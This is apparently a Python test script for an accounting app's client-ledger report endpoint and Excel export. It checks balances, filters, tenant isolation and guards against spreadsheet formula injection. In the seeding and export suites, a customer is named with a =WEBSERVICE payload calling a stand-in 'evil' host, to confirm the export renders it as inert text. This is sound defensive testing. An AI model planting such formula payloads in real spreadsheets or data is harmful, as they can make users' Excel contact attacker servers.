"""
Client Ledger report benchmark — Reports module (2026-08-31).

Pins `GET /api/reports/company/{companyId}/client-ledger` and its Excel
counterpart: the company-wide, every-customer statement that reproduces the
layout of the workbook the operator already keeps
(`Alpha Trader Ledger Jul 2025 to Jun 2026.xlsx`, one sheet per client).

The report is COMPOSED from `ICustomerLedgerService` — the single implementation
of a customer's money trail — and must never re-derive it. Suite 5 proves that
by asserting the report's per-customer figures equal the customer-ledger
endpoint's own aggregates for the same window, figure for figure.

COLUMN CONVENTION (user decision, 2026-08-30) — the operator's own workbook,
the MIRROR of the textbook A/R presentation:
    invoice / DEBIT note               -> CREDIT column
    receipt / CREDIT note / adjustment -> DEBIT  column
    balance = opening + SUM(credit) - SUM(debit)
Positive balance = the customer owes; negative = they hold an advance.
`DocumentType 9 = Debit Note`, `10 = Credit Note` (Invoice.cs:102,151).

Suite 1 replays the workbook's own worked example end to end:
    opening 355,525 -> invoice Credit 862,261 -> 1,217,786
                    -> receipt  Debit 343,536 ->   874,250

Suites:
  1. Workbook worked example  -> opening / running balance / closing, per client
  2. Period filter            -> a narrower window moves the opening forward and
                                 drops the entries outside it; year+month and the
                                 equivalent custom range agree exactly
  3. Client filter            -> clientId returns exactly that customer's section,
                                 identical to its section in the company-wide run;
                                 an unknown or FOREIGN id 404s the same way
  4. Excel export             -> a real .xlsx: Summary sheet + one sheet per
                                 customer, and every operator string neutralised
                                 by CsvSafe (=WEBSERVICE / =HYPERLINK injection)
  5. Composition + notes      -> report figures == ICustomerLedgerService's own
                                 aggregates; credit/debit notes land on the right
                                 side of the ledger

Everything runs in ephemeral companies and is torn down at the end. Production
data is never touched.

Usage:
  python scripts/test_client_ledger_report.py --base http://localhost:5152
  python scripts/test_client_ledger_report.py --base http://localhost:5152 --keep

Exit code 0 = every check passed. 1 = at least one failure.
"""
from __future__ import annotations

import argparse
import io
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from datetime import datetime

results: list[tuple[str, str, bool, str]] = []   # (suite, name, ok, reason)

# The window every "wide" assertion uses. Fixed calendar dates, not offsets, so
# a run on the 1st of a month reads exactly like a run on the 28th.
WIDE_FROM, WIDE_TO = "2025-07-01", "2025-12-31"
NARROW_FROM, NARROW_TO = "2025-09-01", "2025-09-30"


def iso(d: str) -> str:
    return f"{d}T00:00:00Z"


def http(method: str, path: str, base: str, token: str | None = None,
         body=None, timeout: int = 120, raw_bytes: bool = False):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode("utf-8") if body is not None else None
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            payload = r.read()
            if raw_bytes:
                return r.status, payload
            text = payload.decode("utf-8")
            return r.status, (json.loads(text) if text else None)
    except urllib.error.HTTPError as e:
        blob = e.read() if e.fp else b""
        text = blob.decode("utf-8", "replace")
        try:
            return e.code, (json.loads(text) if text else None)
        except Exception:
            return e.code, text


def check(suite: str, name: str, ok: bool, reason: str = "") -> bool:
    results.append((suite, name, ok, reason))
    print(("PASS" if ok else "FAIL") + f" - {name}" + ("" if ok else f"   [{reason}]"))
    return ok


def eq(a, b, tol: float = 0.01) -> bool:
    try:
        return abs(float(a) - float(b)) < tol
    except (TypeError, ValueError):
        return False


def err_of(body) -> str:
    if isinstance(body, dict):
        return str(body.get("message") or body.get("error") or body)
    return str(body)


# ── .xlsx readers (ClosedXML writes the x: namespace prefix) ────────
SHEET_RE = re.compile(r'<(?:\w+:)?sheet\b[^>]*name="([^"]+)"')
SI_RE = re.compile(r"<(?:\w+:)?si>(.*?)</(?:\w+:)?si>", re.S)
T_RE = re.compile(r"<(?:\w+:)?t[^>]*>(.*?)</(?:\w+:)?t>", re.S)
CELLXFS_RE = re.compile(r"<(?:\w+:)?cellXfs\b[^>]*>(.*?)</(?:\w+:)?cellXfs>", re.S)
XF_RE = re.compile(r"<(?:\w+:)?xf\b[^>]*?(/>|>.*?</(?:\w+:)?xf>)", re.S)
CELL_RE = re.compile(
    r'<(?:\w+:)?c\b([^>]*)>\s*<(?:\w+:)?v>(\d+)</(?:\w+:)?v>\s*</(?:\w+:)?c>')


def sheet_names(zf) -> list[str]:
    return SHEET_RE.findall(zf.read("xl/workbook.xml").decode("utf-8", "replace"))


def shared_strings(zf) -> list[str]:
    if "xl/sharedStrings.xml" not in zf.namelist():
        return []
    xml = zf.read("xl/sharedStrings.xml").decode("utf-8", "replace")
    return ["".join(T_RE.findall(si)) for si in SI_RE.findall(xml)]


def quote_prefixed_styles(zf) -> set[int]:
    """Style indices (the `s` attribute of a cell) whose xf carries
    quotePrefix="1" — Excel's own "this is TEXT, never a formula" marker.
    ClosedXML converts CsvSafe's leading apostrophe into exactly this."""
    xml = zf.read("xl/styles.xml").decode("utf-8", "replace")
    body = CELLXFS_RE.search(xml)
    if not body:
        return set()
    return {i for i, m in enumerate(XF_RE.finditer(body.group(1)))
            if 'quotePrefix="1"' in m.group(0)}


def string_cell_styles(zf, sst_index: int) -> list[int]:
    """Style index of every shared-string cell pointing at `sst_index`."""
    out = []
    for part in (n for n in zf.namelist() if n.startswith("xl/worksheets/sheet")):
        xml = zf.read(part).decode("utf-8", "replace")
        for attrs, val in CELL_RE.findall(xml):
            if 't="s"' in attrs and int(val) == sst_index:
                m = re.search(r's="(\d+)"', attrs)
                out.append(int(m.group(1)) if m else 0)
    return out


def formula_cells(zf) -> int:
    """Count of real formula elements anywhere in the workbook — must be 0."""
    n = 0
    for part in (p for p in zf.namelist() if p.startswith("xl/worksheets/sheet")):
        n += len(re.findall(r"<(?:\w+:)?f[ >]", zf.read(part).decode("utf-8", "replace")))
    return n


# ── API helpers ────────────────────────────────────────────────────
def ledger_report(base, token, cid, **params):
    qs = urllib.parse.urlencode({k: v for k, v in params.items() if v is not None})
    st, r = http("GET", f"/api/reports/company/{cid}/client-ledger?{qs}", base, token=token)
    return st, r


def section(report, client_id):
    return next((c for c in (report.get("clients") or []) if c.get("clientId") == client_id), None)


def make_invoice(base, token, cid, client_id, item_type_id, total, date):
    st, inv = http("POST", "/api/invoices/standalone", base, token=token, body={
        "date": iso(date), "companyId": cid, "clientId": client_id, "gstRate": 0,
        "items": [{"description": "Ledger report good", "quantity": 1, "uom": "Pcs",
                   "unitPrice": total, "itemTypeId": item_type_id}]})
    return inv if st in (200, 201) and isinstance(inv, dict) else None


def make_receipt(base, token, cid, client_id, amount, date, allocations=None):
    st, r = http("POST", f"/api/payments/receipts/company/{cid}", base, token=token, body={
        "direction": "Receipt", "date": iso(date), "contactType": "Client",
        "contactId": client_id, "method": "Cash", "amount": amount,
        "allocations": allocations or []})
    return st, r


def make_note(base, token, invoice_id, document_type, date, reason):
    st, n = http("POST", "/api/invoices/notes", base, token=token, body={
        "originalInvoiceId": invoice_id, "documentType": document_type,
        "reason": reason, "affectsStock": False, "date": iso(date)})
    return st, n


# ── Suite 1: the workbook's own worked example ─────────────────────
def suite_1_worked_example(base, token, cid, clients, item_type_id):
    """Alpha: an invoice BEFORE the window becomes the opening, then the window
       carries one invoice and one receipt — the reference workbook's numbers."""
    suite = "1. Workbook worked example"
    print(f"\n=== {suite} ===")

    st, r = ledger_report(base, token, cid, dateFrom=WIDE_FROM, dateTo=WIDE_TO)
    if not check(suite, "report loads for the wide window", st == 200 and isinstance(r, dict),
                 f"got {st} {err_of(r)}"):
        return None

    check(suite, "period echoes back as the requested range",
          r.get("dateFrom", "").startswith(WIDE_FROM) and r.get("dateTo", "").startswith(WIDE_TO),
          f"from={r.get('dateFrom')} to={r.get('dateTo')}")
    check(suite, "no client filter was applied", r.get("clientId") is None,
          f"clientId={r.get('clientId')}")

    a = section(r, clients["alpha"])
    if not check(suite, "Alpha has a section", a is not None,
                 f"sections={[c.get('clientName') for c in r.get('clients') or []]}"):
        return r

    check(suite, "opening 355,525 — the invoice STRICTLY BEFORE the window",
          eq(a["opening"], 355525), f"got {a['opening']}")
    check(suite, "credit 862,261 — the in-window invoice",
          eq(a["totalCredit"], 862261), f"got {a['totalCredit']}")
    check(suite, "debit 343,536 — the in-window receipt",
          eq(a["totalDebit"], 343536), f"got {a['totalDebit']}")
    check(suite, "closing 874,250 == opening + credit - debit",
          eq(a["closing"], 874250) and eq(a["closing"], a["opening"] + a["totalCredit"] - a["totalDebit"]),
          f"got {a['closing']}")
    check(suite, "outstanding 874,250 / advance 0 (the customer owes)",
          eq(a["outstanding"], 874250) and eq(a["advance"], 0),
          f"outstanding={a['outstanding']} advance={a['advance']}")

    entries = a.get("entries") or []
    check(suite, "exactly 2 entries in the window", len(entries) == 2,
          f"got {[e.get('reference') for e in entries]}")
    if len(entries) == 2:
        check(suite, "entries are OLDEST-first with S.No 1..n (workbook order)",
              [e["sr"] for e in entries] == [1, 2] and entries[0]["date"] <= entries[1]["date"],
              f"sr={[e['sr'] for e in entries]} dates={[e['date'] for e in entries]}")
        check(suite, "running balance 1,217,786 then 874,250 (the workbook's own figures)",
              eq(entries[0]["balance"], 1217786) and eq(entries[1]["balance"], 874250),
              f"got {[e['balance'] for e in entries]}")
        check(suite, "the invoice sits in the CREDIT column",
              eq(entries[0]["credit"], 862261) and eq(entries[0]["debit"], 0)
              and entries[0]["type"] == "Invoice",
              f"got {entries[0]}")
        check(suite, "the receipt sits in the DEBIT column",
              eq(entries[1]["debit"], 343536) and eq(entries[1]["credit"], 0)
              and entries[1]["type"] == "Receipt",
              f"got {entries[1]}")
        check(suite, "column C is normalised to the document reference (INV-/RCP-)",
              entries[0]["reference"].startswith("INV-") and entries[1]["reference"].startswith("RCP-"),
              f"got {[e['reference'] for e in entries]}")
        check(suite, "column D carries particulars for every row",
              all((e.get("particulars") or "").strip() for e in entries),
              f"got {[e.get('particulars') for e in entries]}")

    # A customer whose only money is an unallocated receipt holds an advance.
    g = section(r, clients["gamma"])
    if check(suite, "Gamma (cash only, nothing invoiced) has a section", g is not None):
        check(suite, "Gamma's closing is -75,000 — an advance, not a debt",
              eq(g["closing"], -75000) and eq(g["advance"], 75000) and eq(g["outstanding"], 0),
              f"closing={g['closing']} advance={g['advance']} outstanding={g['outstanding']}")

    # Dormant customers must not pad a company-wide statement.
    check(suite, "the customer with no activity and no balance is omitted",
          section(r, clients["dormant"]) is None,
          f"sections={[c.get('clientName') for c in r.get('clients') or []]}")

    check(suite, "grand totals equal the sum of the sections",
          eq(r["grandOpening"], sum(c["opening"] for c in r["clients"]))
          and eq(r["grandDebit"], sum(c["totalDebit"] for c in r["clients"]))
          and eq(r["grandCredit"], sum(c["totalCredit"] for c in r["clients"]))
          and eq(r["grandClosing"], r["grandOpening"] + r["grandCredit"] - r["grandDebit"]),
          f"opening={r['grandOpening']} debit={r['grandDebit']} "
          f"credit={r['grandCredit']} closing={r['grandClosing']}")
    check(suite, "clientCount / entryCount match the payload",
          r["clientCount"] == len(r["clients"])
          and r["entryCount"] == sum(len(c["entries"]) for c in r["clients"]),
          f"clientCount={r['clientCount']} entryCount={r['entryCount']}")
    return r


# ── Suite 2: the period filter genuinely narrows ───────────────────
def suite_2_period(base, token, cid, clients, wide):
    suite = "2. Period filter"
    print(f"\n=== {suite} ===")

    st, narrow = ledger_report(base, token, cid, dateFrom=NARROW_FROM, dateTo=NARROW_TO)
    if not check(suite, "report loads for September 2025 only",
                 st == 200 and isinstance(narrow, dict), f"got {st} {err_of(narrow)}"):
        return

    a = section(narrow, clients["alpha"])
    if not check(suite, "Alpha still has a section", a is not None):
        return

    check(suite, "opening rolled FORWARD to 1,217,786 (Mar invoice + Aug invoice)",
          eq(a["opening"], 1217786), f"got {a['opening']}")
    check(suite, "the August invoice is no longer an entry — only the receipt is",
          len(a["entries"]) == 1 and a["entries"][0]["type"] == "Receipt",
          f"got {[(e['type'], e['reference']) for e in a['entries']]}")
    check(suite, "credit 0 / debit 343,536 inside the narrow window",
          eq(a["totalCredit"], 0) and eq(a["totalDebit"], 343536),
          f"credit={a['totalCredit']} debit={a['totalDebit']}")
    check(suite, "closing is unchanged at 874,250 — a window moves the split, not the balance",
          eq(a["closing"], 874250), f"got {a['closing']}")

    wide_a = section(wide, clients["alpha"])
    check(suite, "the narrow window really is narrower than the wide one",
          len(a["entries"]) < len(wide_a["entries"]) and not eq(a["opening"], wide_a["opening"]),
          f"narrow={len(a['entries'])} wide={len(wide_a['entries'])}")

    # The year/month contract must land on the same window as the equivalent range.
    st, ym = ledger_report(base, token, cid, year=2025, month=9)
    if check(suite, "year=2025&month=9 loads", st == 200 and isinstance(ym, dict),
             f"got {st} {err_of(ym)}"):
        ym_a = section(ym, clients["alpha"])
        check(suite, "year+month == the equivalent custom range, figure for figure",
              ym_a is not None and eq(ym_a["opening"], a["opening"])
              and eq(ym_a["totalDebit"], a["totalDebit"])
              and eq(ym_a["totalCredit"], a["totalCredit"])
              and eq(ym_a["closing"], a["closing"])
              and len(ym_a["entries"]) == len(a["entries"]),
              f"got {ym_a}")
        check(suite, "year/month echo back on the DTO",
              ym.get("year") == 2025 and ym.get("month") == 9,
              f"year={ym.get('year')} month={ym.get('month')}")

    # Full year 2025 sees everything, including what the wide window opened with.
    st, y = ledger_report(base, token, cid, year=2025)
    if check(suite, "year=2025 (full year) loads", st == 200 and isinstance(y, dict),
             f"got {st} {err_of(y)}"):
        y_a = section(y, clients["alpha"])
        check(suite, "a full year has no opening and 3 entries for Alpha",
              y_a is not None and eq(y_a["opening"], 0) and len(y_a["entries"]) == 3,
              f"opening={(y_a or {}).get('opening')} entries={len((y_a or {}).get('entries') or [])}")
        check(suite, "the full year closes at the same 874,250",
              y_a is not None and eq(y_a["closing"], 874250), f"got {(y_a or {}).get('closing')}")

    # Bad periods must be rejected by the SHARED validator, not silently coerced.
    st, _ = ledger_report(base, token, cid, dateFrom=WIDE_FROM)
    check(suite, "a half-supplied custom range is a 400", st == 400, f"got {st}")
    st, _ = ledger_report(base, token, cid, dateFrom=WIDE_TO, dateTo=WIDE_FROM)
    check(suite, "an inverted custom range is a 400", st == 400, f"got {st}")
    st, _ = ledger_report(base, token, cid, year=2025, month=13)
    check(suite, "month=13 is a 400", st == 400, f"got {st}")


# ── Suite 3: the client filter ─────────────────────────────────────
def suite_3_client_filter(base, token, cid, clients, wide, foreign):
    suite = "3. Client filter"
    print(f"\n=== {suite} ===")

    st, one = ledger_report(base, token, cid, dateFrom=WIDE_FROM, dateTo=WIDE_TO,
                            clientId=clients["alpha"])
    if not check(suite, "filtered report loads", st == 200 and isinstance(one, dict),
                 f"got {st} {err_of(one)}"):
        return

    check(suite, "exactly one customer comes back", len(one.get("clients") or []) == 1,
          f"got {[c.get('clientName') for c in one.get('clients') or []]}")
    check(suite, "the filter echoes back with the resolved name",
          one.get("clientId") == clients["alpha"] and one.get("clientName"),
          f"clientId={one.get('clientId')} clientName={one.get('clientName')}")

    filtered = section(one, clients["alpha"])
    unfiltered = section(wide, clients["alpha"])
    check(suite, "the filtered section is identical to its company-wide counterpart",
          filtered is not None and unfiltered is not None
          and eq(filtered["opening"], unfiltered["opening"])
          and eq(filtered["totalDebit"], unfiltered["totalDebit"])
          and eq(filtered["totalCredit"], unfiltered["totalCredit"])
          and eq(filtered["closing"], unfiltered["closing"])
          and [e["reference"] for e in filtered["entries"]] == [e["reference"] for e in unfiltered["entries"]],
          f"filtered={filtered} unfiltered={unfiltered}")

    st, _ = ledger_report(base, token, cid, dateFrom=WIDE_FROM, dateTo=WIDE_TO, clientId=99999999)
    check(suite, "an unknown clientId is a 404", st == 404, f"got {st}")

    # A client that exists, but in ANOTHER company, must fail exactly like an
    # unknown one — never confirm it exists elsewhere.
    st, body = ledger_report(base, token, cid, dateFrom=WIDE_FROM, dateTo=WIDE_TO,
                             clientId=foreign["client_id"])
    check(suite, "a FOREIGN clientId is the same generic 404",
          st == 404 and "not found" in err_of(body).lower(), f"got {st} {err_of(body)}")


# ── Suite 4: the Excel export ──────────────────────────────────────
def suite_4_excel(base, token, cid, clients):
    suite = "4. Excel export"
    print(f"\n=== {suite} ===")

    qs = urllib.parse.urlencode({"dateFrom": WIDE_FROM, "dateTo": WIDE_TO})
    st, blob = http("GET", f"/api/reports/company/{cid}/client-ledger/excel?{qs}",
                    base, token=token, raw_bytes=True)
    if not check(suite, "export returns 200 with bytes",
                 st == 200 and isinstance(blob, bytes) and len(blob) > 2000,
                 f"got {st}, {len(blob) if isinstance(blob, bytes) else blob} bytes"):
        return

    check(suite, "the payload is a real .xlsx (ZIP magic bytes)", blob[:2] == b"PK",
          f"got {blob[:8]!r}")
    try:
        zf = zipfile.ZipFile(io.BytesIO(blob))
    except Exception as e:                                   # noqa: BLE001
        check(suite, "the .xlsx opens as a workbook", False, str(e))
        return
    names = zf.namelist()
    check(suite, "the .xlsx opens as a workbook with a workbook part",
          "xl/workbook.xml" in names, f"parts={names[:6]}")

    sheets = sheet_names(zf)
    check(suite, "sheet 1 is the Summary", sheets[:1] == ["Summary"], f"sheets={sheets}")
    check(suite, "one sheet per customer follows the Summary",
          len(sheets) == 1 + len(clients["with_activity"]),
          f"sheets={sheets}, expected {1 + len(clients['with_activity'])} in total")

    sst = shared_strings(zf)
    check(suite, "the workbook carries its layout labels (Ledger / headers / opening row)",
          all(tok in sst for tok in ("Ledger", "S.No", "Inv / Ref", "Particulars",
                                     "Opening Balance", "Closing Balance")),
          f"strings={sst[:12]}")

    # CsvSafe on an operator-controlled customer name. ClosedXML consumes the
    # leading apostrophe CsvSafe adds and re-emits it as Excel's own quotePrefix
    # style flag, so the guard shows up in styles.xml, not in the string itself.
    # Both halves matter: the cell must be TEXT-flagged, and the workbook must
    # contain no formula element at all.
    inject = '=WEBSERVICE("http://evil/x")'
    if check(suite, "the injection-named customer reached the workbook", inject in sst,
             f"strings={sst[:14]}"):
        qp = quote_prefixed_styles(zf)
        styles = string_cell_styles(zf, sst.index(inject))
        check(suite, "every cell holding it is quote-prefixed (CsvSafe applied)",
              bool(styles) and all(s in qp for s in styles),
              f"cell styles={styles} quote-prefixed styles={sorted(qp)}")
    check(suite, "the workbook contains no formula cell at all",
          formula_cells(zf) == 0, f"{formula_cells(zf)} formula element(s) found")

    # A single-customer export is still a valid workbook.
    qs = urllib.parse.urlencode({"dateFrom": WIDE_FROM, "dateTo": WIDE_TO,
                                 "clientId": clients["alpha"]})
    st, one = http("GET", f"/api/reports/company/{cid}/client-ledger/excel?{qs}",
                   base, token=token, raw_bytes=True)
    ok = st == 200 and isinstance(one, bytes) and one[:2] == b"PK"
    if check(suite, "a filtered export is also a valid .xlsx", ok, f"got {st}"):
        sheets1 = sheet_names(zipfile.ZipFile(io.BytesIO(one)))
        check(suite, "a filtered export holds Summary + exactly one customer sheet",
              len(sheets1) == 2, f"sheets={sheets1}")


# ── Suite 5: composition, not re-derivation ────────────────────────
def suite_5_composition(base, token, cid, clients, wide):
    """The report must be a VIEW over ICustomerLedgerService. If its numbers can
       drift from that service's own aggregates, it has grown a second ledger."""
    suite = "5. Composition + notes"
    print(f"\n=== {suite} ===")

    qs = urllib.parse.urlencode({"from": iso(WIDE_FROM), "to": iso(WIDE_TO)})
    st, rows = http("GET", f"/api/customer-ledger/company/{cid}?{qs}", base, token=token)
    if not check(suite, "the customer-ledger aggregates load for the same window",
                 st == 200 and isinstance(rows, list), f"got {st} {err_of(rows)}"):
        return
    by_id = {r["clientId"]: r for r in rows}

    mismatches = []
    for c in wide["clients"]:
        src = by_id.get(c["clientId"])
        if src is None:
            mismatches.append(f"{c['clientName']}: missing from the ledger service")
            continue
        if not (eq(c["opening"], src["opening"]) and eq(c["totalCredit"], src["invoiced"])
                and eq(c["totalDebit"], src["received"]) and eq(c["closing"], src["closing"])):
            mismatches.append(f"{c['clientName']}: report={c} service={src}")
    check(suite, "every section equals the ledger service's own aggregate, figure for figure",
          not mismatches, "; ".join(mismatches))

    # Each section's entries must reconcile to its own totals.
    bad = [c["clientName"] for c in wide["clients"]
           if not (eq(sum(e["credit"] for e in c["entries"]), c["totalCredit"])
                   and eq(sum(e["debit"] for e in c["entries"]), c["totalDebit"]))]
    check(suite, "each section's entries sum to its Debit / Credit totals", not bad, f"{bad}")

    # And the running balance must actually run.
    bad = []
    for c in wide["clients"]:
        run = c["opening"]
        for e in c["entries"]:
            run += e["credit"] - e["debit"]
            if not eq(run, e["balance"]):
                bad.append(f"{c['clientName']} @ {e['reference']}: {e['balance']} != {run}")
    check(suite, "column H is a true running balance from the opening row", not bad, "; ".join(bad))

    # Notes: 9 = DEBIT NOTE -> Credit column, 10 = CREDIT NOTE -> Debit column.
    # Inverting these would overstate the customer's debt by twice each note.
    b = section(wide, clients["beta"])
    if not check(suite, "Beta (the notes customer) has a section", b is not None):
        return
    cn = [e for e in b["entries"] if e["type"] == "Credit Note"]
    dn = [e for e in b["entries"] if e["type"] == "Debit Note"]
    check(suite, "the credit note is present, CN-referenced, in the DEBIT column",
          len(cn) == 1 and cn[0]["reference"].startswith("CN-")
          and cn[0]["debit"] > 0 and eq(cn[0]["credit"], 0), f"got {cn}")
    check(suite, "the debit note is present, DN-referenced, in the CREDIT column",
          len(dn) == 1 and dn[0]["reference"].startswith("DN-")
          and dn[0]["credit"] > 0 and eq(dn[0]["debit"], 0), f"got {dn}")
    check(suite, "Beta closes at 0 — invoice paid, then a credit note and a debit note of equal value",
          eq(b["closing"], 0), f"got {b['closing']}")


# ── Suite 6: tenant isolation, live ────────────────────────────────
def suite_6_tenant_isolation(base, token, cid, foreign):
    """A user scoped to ANOTHER company must not read this one's statements.
       The user carries the Administrator RBAC role on purpose, so RBAC is not
       what stops them — only [AuthorizeCompany] is."""
    suite = "6. Tenant isolation (live)"
    print(f"\n=== {suite} ===")

    st, roles = http("GET", "/api/roles", base, token=token)
    role_id = next((r["id"] for r in roles if r.get("name") == "Administrator"), None) \
        if st == 200 and isinstance(roles, list) else None
    if not check(suite, "Administrator role found", role_id is not None, f"got {st}"):
        return None

    uname = f"_clr_outsider_{datetime.now().strftime('%H%M%S')}"
    st, u = http("POST", "/api/users", base, token=token, body={
        "username": uname, "password": "Outsider!2345", "email": f"{uname}@example.test",
        "fullName": "Client Ledger Outsider", "role": "Administrator"})
    if not check(suite, "an outsider user is created", st in (200, 201) and isinstance(u, dict),
                 f"got {st} {err_of(u)}"):
        return None
    uid = u["id"]

    http("PUT", f"/api/users/{uid}/roles", base, token=token, body={"roleIds": [role_id]})
    # Scoped to the OTHER company only — never to `cid`.
    st, _ = http("PUT", f"/api/usercompanies/user/{uid}", base, token=token,
                 body={"companyIds": [foreign["company_id"]]})
    check(suite, "the outsider is scoped to the other company only", st == 200, f"got {st}")

    st, data = http("POST", "/api/auth/login", base, body={"username": uname, "password": "Outsider!2345"})
    if not check(suite, "the outsider can log in", st == 200 and isinstance(data, dict), f"got {st}"):
        return uid
    otoken = data["token"]

    st, body = ledger_report(base, otoken, cid, dateFrom=WIDE_FROM, dateTo=WIDE_TO)
    check(suite, "the outsider is 403'd on the report for a company they cannot see",
          st == 403, f"got {st} {err_of(body)}")

    qs = urllib.parse.urlencode({"dateFrom": WIDE_FROM, "dateTo": WIDE_TO})
    st, _ = http("GET", f"/api/reports/company/{cid}/client-ledger/excel?{qs}", base, token=otoken)
    check(suite, "the outsider is 403'd on the export too", st == 403, f"got {st}")

    # And they CAN read their own company — proof the 403 is scope, not a broken route.
    st, own = ledger_report(base, otoken, foreign["company_id"], dateFrom=WIDE_FROM, dateTo=WIDE_TO)
    check(suite, "the outsider can still read their OWN company's report",
          st == 200 and isinstance(own, dict), f"got {st} {err_of(own)}")
    return uid


# ── Static guard: the endpoints keep their guards ──────────────────
def suite_0_static(repo_root):
    suite = "0. Endpoint guards (static)"
    print(f"\n=== {suite} ===")
    try:
        src = open(f"{repo_root}/Controllers/ReportsController.cs", encoding="utf-8").read()
    except OSError as e:
        check(suite, "ReportsController.cs is readable", False, str(e))
        return
    for perm, action in (("reports.clientledger.view", "GetClientLedger"),
                         ("reports.clientledger.export", "GetClientLedgerExcel")):
        block = src.split(f"public async Task")
        hit = next((b for b in block if action in b.split("(")[0]), "")
        idx = src.find(f"{action}(")
        head = src[max(0, idx - 700):idx]
        check(suite, f"{action} carries [HasPermission(\"{perm}\")]",
              f'[HasPermission("{perm}")]' in head, "attribute missing")
        check(suite, f"{action} carries [AuthorizeCompany]", "[AuthorizeCompany]" in head,
              "tenant guard missing")
        check(suite, f"{action} validates the shared period contract",
              "ValidatePeriod(year, month, dateFrom, dateTo)" in (hit or ""),
              "does not call ValidatePeriod")
    check(suite, "no endpoint returns ex.Message to the client",
          "ex.Message" not in src, "ex.Message found in ReportsController")


# ── Setup / teardown ───────────────────────────────────────────────
def make_company(base, token, name, gl=True):
    st, company = http("POST", "/api/companies", base, token=token, body={
        "name": name, "startingInvoiceNumber": 1, "startingPurchaseBillNumber": 1,
        "startingChallanNumber": 1, "startingGoodsReceiptNumber": 1,
        "fbrEnabled": False, "inventoryTrackingEnabled": False, "enableGl": gl})
    if st not in (200, 201):
        print(f"FATAL: company create failed ({st} {company})")
        sys.exit(2)
    return company["id"]


def make_client(base, token, cid, name):
    st, c = http("POST", "/api/clients", base, token=token, body={
        "name": name, "companyId": cid, "registrationType": "Unregistered"})
    if st not in (200, 201):
        print(f"FATAL: client create failed for {name!r} ({st} {c})")
        sys.exit(2)
    return c["id"]


def first_item_type(base, token):
    _, its = http("GET", "/api/itemtypes", base, token=token)
    rows = its if isinstance(its, list) else ((its or {}).get("items") or (its or {}).get("data") or [])
    return rows[0]["id"] if rows else None


def seed(base, token, cid, item_type_id):
    """The reference workbook's own figures, plus the cases around them."""
    sfx = datetime.now().strftime("%H%M%S")
    ids = {
        "alpha": make_client(base, token, cid, f"Alpha Traders {sfx}"),
        "beta": make_client(base, token, cid, f"Beta Enterprises {sfx}"),
        "gamma": make_client(base, token, cid, f"Gamma Supplies {sfx}"),
        "dormant": make_client(base, token, cid, f"Dormant Trading {sfx}"),
        # An operator-controlled name that WOULD execute in Excel if the export
        # skipped CsvSafe. It must survive as inert text.
        "inject": make_client(base, token, cid, '=WEBSERVICE("http://evil/x")'),
    }

    # Alpha — the workbook's worked example.
    make_invoice(base, token, cid, ids["alpha"], item_type_id, 355525, "2025-03-10")  # opening
    make_invoice(base, token, cid, ids["alpha"], item_type_id, 862261, "2025-08-15")  # Credit
    make_receipt(base, token, cid, ids["alpha"], 343536, "2025-09-20")                # Debit

    # Beta — an invoice cleared in full, then one note of each kind. FBR is off,
    # so a note needs a fully PAID original.
    inv = make_invoice(base, token, cid, ids["beta"], item_type_id, 200000, "2025-07-05")
    if inv:
        make_receipt(base, token, cid, ids["beta"], 200000, "2025-07-06",
                     allocations=[{"invoiceId": inv["id"], "amount": 200000}])
        make_note(base, token, inv["id"], 10, "2025-07-10", "Return of goods")
        make_note(base, token, inv["id"], 9, "2025-07-12", "Change in value of supply")

    # Gamma — pure cash, nothing invoiced: a customer advance.
    make_receipt(base, token, cid, ids["gamma"], 75000, "2025-10-02")

    # Inject — one plain invoice so the customer earns a sheet in the export.
    make_invoice(base, token, cid, ids["inject"], item_type_id, 1000, "2025-11-11")

    # Dormant gets nothing at all.
    ids["with_activity"] = [ids["alpha"], ids["beta"], ids["gamma"], ids["inject"]]
    return ids


def setup(base, user, pw):
    st, data = http("POST", "/api/auth/login", base, body={"username": user, "password": pw})
    if st != 200:
        print(f"FATAL: login failed ({st} {data})")
        sys.exit(2)
    token = data["token"]
    sfx = datetime.now().strftime("%Y%m%d%H%M%S")
    item_type_id = first_item_type(base, token)
    if item_type_id is None:
        print("FATAL: no item type available")
        sys.exit(2)

    cid = make_company(base, token, f"_test_client_ledger_report {sfx}")
    clients = seed(base, token, cid, item_type_id)

    other = make_company(base, token, f"_test_client_ledger_report_other {sfx}", gl=False)
    foreign = {"company_id": other,
               "client_id": make_client(base, token, other, f"Foreign Client {sfx}")}
    return token, cid, clients, item_type_id, foreign


def teardown(base, token, cids, keep, user_id=None):
    if keep:
        print(f"\n(kept companies {cids}, user {user_id})")
        return
    if user_id:
        http("DELETE", f"/api/users/{user_id}", base, token=token)
    for cid in cids:
        http("DELETE", f"/api/companies/{cid}", base, token=token)
    print(f"\n(cleaned up companies {cids}" + (f", user {user_id}" if user_id else "") + ")")


def report() -> int:
    passed = sum(1 for _, _, ok, _ in results if ok)
    total = len(results)
    print("\n" + "=" * 62)
    for s, n, ok, r in results:
        if not ok:
            print(f"FAILED  {s} :: {n}   [{r}]")
    print(f"{passed}/{total} checks passed")
    return 0 if passed == total else 1


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--base", default="http://localhost:5134")
    p.add_argument("--admin-user", default="admin")
    p.add_argument("--admin-pw", default="admin123")
    p.add_argument("--repo-root", default=".")
    p.add_argument("--keep", action="store_true",
                   help="Leave the ephemeral companies in the DB after the run.")
    args = p.parse_args()
    base = args.base

    token, cid, clients, item_type_id, foreign = setup(base, args.admin_user, args.admin_pw)
    print(f"\n== company={cid} itemType={item_type_id} clients={clients} foreign={foreign} ==")

    outsider = None
    try:
        suite_0_static(args.repo_root)
        wide = suite_1_worked_example(base, token, cid, clients, item_type_id)
        if wide:
            suite_2_period(base, token, cid, clients, wide)
            suite_3_client_filter(base, token, cid, clients, wide, foreign)
            suite_4_excel(base, token, cid, clients)
            suite_5_composition(base, token, cid, clients, wide)
        outsider = suite_6_tenant_isolation(base, token, cid, foreign)
    finally:
        teardown(base, token, [cid, foreign["company_id"]], args.keep, outsider)

    return report()


if __name__ == "__main__":
    sys.exit(main())
